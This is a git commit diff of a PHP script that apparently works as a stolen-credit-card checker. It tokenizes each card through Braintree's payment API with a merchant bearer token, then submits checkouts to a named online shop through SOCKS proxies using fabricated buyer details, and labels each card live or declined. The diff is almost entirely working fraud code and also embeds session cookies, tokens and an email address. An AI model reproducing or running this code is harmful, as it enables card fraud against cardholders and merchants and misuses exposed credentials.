71f81ba3cbc3a63190e01b506c9fa421753ea119
Hotshot <pubgkittu@gmail.com>
2020-06-12 22:36:01 -0700

    Update api.php

--- api.php
+++ api.php
@@ -111,7 +111,7 @@ function email($nombre){
 ///$cpf = cpf(1);
 $nombre = datosnombre();
 $apellido = datosapellido();
-$email = email($nombre);
+// $email = email($nombre);
 $zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
 $idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
 $username = 'lum-customer-hl_6366aa06-zone-static_res';
@@ -133,28 +133,33 @@ function ibuuproxy(){
 $poxySocks5 = ibuuproxy();
 
 $fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
-// $lname = 'Wang';
-// $email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
-// $email2 = $fname.rand(10,999).'@yopmail.com';
+$lname = 'Wang';
+$email1 = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
+ // $email2 = $fname.rand(10,999).'@yopmail.com';
 // //$password = 'P@5%Word';
 // $password2 = 'Hansabhen1@';
-$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz",999)), 0, 32);
-$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz",999)), 0, 32);
+$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
+$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
 
 $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 
-// echo $counters2;
 
 
-function updatecart(){
+
+
+
+
+
+curl_close($ch);
+
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://airstreamsupplycompany.com/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+   curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+   curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -165,68 +170,40 @@ curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json, text/plain, */*',
-'accept-encoding: gzip, deflate, br',
-'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded',
-'cookie: wordpress_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C73b56130f108e7166ee0fff069ff4e84d70d9d11c3aa02ca543c9ae2db58462e; __cfduid=df5372fcdee78465656bb375d67509c131591513584; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3Amy1J4AKRU55%2FBiz1dRU5ybIN; wordpress_logged_in_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C46f5f04f803cd95748af0da6c1c31872324017fb1b96fc0a337ed068f3208131; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=2659%7C%7C1591691080%7C%7C1591687480%7C%7Cae1c2b7c25705f954be8e5c77531ba99; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22true%22%2C%22username%22:%22%5C%22Vincent%5C%22%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}',
-'origin: https://airstreamsupplycompany.com',
-'referer: https://airstreamsupplycompany.com/products/interstate-carabiner-d-style-keychain',
-'user-agent: '.$browser.''
-));
-
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=woocommerce_add_to_cart&product_id=6449&quantity=1&nonce=acdd747418');
-
-}
-$update = curl_exec($ch);
-
-$hash = trim(strip_tags(getstr($update,'"cart_hash":"','"')));
-
-//============================================================================================================================================================
- // Request 1
-
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POST, 1);
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-# Uncomment the upper two lines if you have filled the upper login details
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTE4NDM1MzIsImp0aSI6IjFlNjM2OWE5LWJhNGYtNGI0My1iNDBkLTE2OWZlMWIwYTRmMCIsInN1YiI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQWlyc3RyZWFtSW5jX2luc3RhbnQifX0._MSM6ZySLaoVk9lpReVJuHTOBvC7NqByAMjd81ybWkKzmSaaK5plrl6g5ykK2T6Cpp3Tf_z3bM2mN3Uc2MMxRw',
+'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTIxMDQ5OTksImp0aSI6Ijc2NmFjZDFhLWY2NmYtNGE4MS04M2U5LWNlZTkwNDQxMzZhZSIsInN1YiI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQWlyc3RyZWFtSW5jX2luc3RhbnQifX0.1MkDnEppzaS5f6lubkPFSxX2F9M34HevbHm8M5M1T3xgVf5qooPgt6TLNtuGAf1v9SPaCMazfVJbFIcWWxRJkw',
 'braintree-version: 2018-05-10',
 'content-type: application/json',
 'origin: https://assets.braintreegateway.com',
 'referer: https://payments.braintree-api.com/',
 'user-agent: '.$browser.''
 ));
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"dbdc2b6d-fbe1-40ad-8ac5-0b8b0d6f79bd"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"10646188-5541-49e0-bbba-2da26e0e3453"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+
 
 $b_pago = curl_exec($ch);
 
-curl_close($ch);
-
-   // echo $b_pago;
 $token = trim(strip_tags(getstr($b_pago,'"token":"','"')));
-// $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
-$issuebank = trim(strip_tags(getstr($b_pago,'"bank": "','"')));
-$issuecountry = trim(strip_tags(getstr($b_pago,'"country": "','"')));
-$type = trim(strip_tags(getstr($b_pago,'"financing": "','"')));
-$category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));
+ $country = trim(strip_tags(getstr($b_pago,'"issuingCountry":"','"')));
+ $bank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
+ $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
+ $category = trim(strip_tags(getstr($a_pago,'"card_category":"','"')));
+ $brand = trim(strip_tags(getstr($a_pago,' "card_brand":"','"')));
 
 
+  // echo $b_pago;
 
+// echo $token;
+
+// echo $ccnum;
+// echo $mes1;
+// echo $ano;
+// echo $cvv;
+
+// // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://airstreamsupplycompany.com/?wc-ajax=checkout');
@@ -250,19 +227,19 @@ curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING T
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 // End Proxy Calls
-curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
- curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: application/json, text/javascript, */*; q=0.01',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: __cfduid=df5372fcdee78465656bb375d67509c131591513584; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3Amy1J4AKRU55%2FBiz1dRU5ybIN; wordpress_logged_in_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C46f5f04f803cd95748af0da6c1c31872324017fb1b96fc0a337ed068f3208131; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22true%22%2C%22username%22:%22%5C%22Vincent%5C%22%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}; woocommerce_items_in_cart=1; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=2659%7C%7C1591873952%7C%7C1591870352%7C%7Caaf5c6268cbf32822718492f5575efc6; woocommerce_cart_hash=97d0875ca548471533ae727af3f22d8d',
+'cookie: __cfduid=d55665530dd99891ba0ee7d71215c38ae1592018202; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22false%22%2C%22username%22:%22null%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3ASCdbWeis28A2IAusgceP44k%2B; woocommerce_items_in_cart=1; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=a7808208a5203b799ee68b46b43426c9%7C%7C1592191395%7C%7C1592187795%7C%7C093b0a8a478f121bfae8ea9a2360f71c; woocommerce_cart_hash=7957ba0ef000bac82a9079f6a774b596',
 'origin: https://airstreamsupplycompany.com',
 'referer: https://airstreamsupplycompany.com/checkout/',
 'user-agent: '.$browser.''
@@ -270,9 +247,9 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'shipping_email=pubgkittu%40gmail.com&shipping_phone=5182641524&ship_to_different_address=1&shipping_first_name=Vincent&shipping_last_name=Warner&shipping_country=US&shipping_address_1=24+moo+4+tambol+Pluakdaeng&shipping_address_2=&shipping_city=Miami&shipping_state=FL&shipping_postcode=33101&payment_method=braintree_payment_gateway&braintree_payment_gateway_nonce='.$token.'&braintree_device_data=&bfwc_is_vaulted_nonce=&woocommerce-process-checkout-nonce=95681f8f32&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&billing_first_name=Vincent&billing_last_name=Warner&billing_country=US&billing_address_1=24+moo+4+tambol+Pluakdaeng&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_email=pubgkittu%40gmail.com');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'shipping_email=pubgkittu%40gmail.com&shipping_phone=&ship_to_different_address=1&shipping_first_name=Vincent&shipping_last_name=Warner&shipping_country=US&shipping_address_1=+12th+Ave&shipping_address_2=&shipping_city=New+York&shipping_state=NY&shipping_postcode=10080&payment_method=braintree_payment_gateway&braintree_payment_gateway_nonce='.$token.'&braintree_device_data=&bfwc_is_vaulted_nonce=&woocommerce-process-checkout-nonce=1b96500a61&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&billing_first_name=Vincent&billing_last_name=Warner&billing_country=US&billing_address_1=+12th+Ave+S&billing_address_2=&billing_city=miami&billing_state=FL&billing_postcode=33101&billing_email=pubgkittu%40gmail.com&account_password=');
 
-// // // //*****************************************************************************************************************************************************************************************************************************************************************************
+// // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
 
 $result = curl_exec($ch);
@@ -280,33 +257,30 @@ if (curl_errno($ch)) {
     echo 'Error:'.curl_error($ch);
 }
 curl_close($ch);
-
 $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tThere was an error processing your payment. Reason: ','\t\t<\/li>\n\t<\/ul>\n<input type=\"hidden\" id=\"bfwc_checkout_error\" value=\"true\" \/>"')));
-//  // $code = trim(strip_tags(getstr($result,'"status":"','"')));
-//  // $message2 = trim(strip_tags(getstr($result,'"decline_code": "','"')));
+// $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
+// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
 
-// //////////////////////// BIN INFO ////////////////////////////////
 
-// /////////////////// RESULT ////////////////////////////////////
+// // // /////////////////////// RESULT ////////////////////////////////////
 if(strpos($result,'"result":"success"')){
-  updatecart();
+// updatecart();
+    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+    }
+elseif(strpos($result,'Not Acceptable!')) {
 
-      echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' |  '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
 
-   }
-elseif(strpos($result,'Too Many Attempts.')){
-         echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [TOO MANY TRIES]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' |  '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
-   }
+  }
+
 else {
 
+            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
 
-         echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' |  '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
-
-}
-
+  }
 curl_close($curl);
 ob_flush();
-       // echo $result;
+     // echo $result;
 //echo $browser;
 ?>
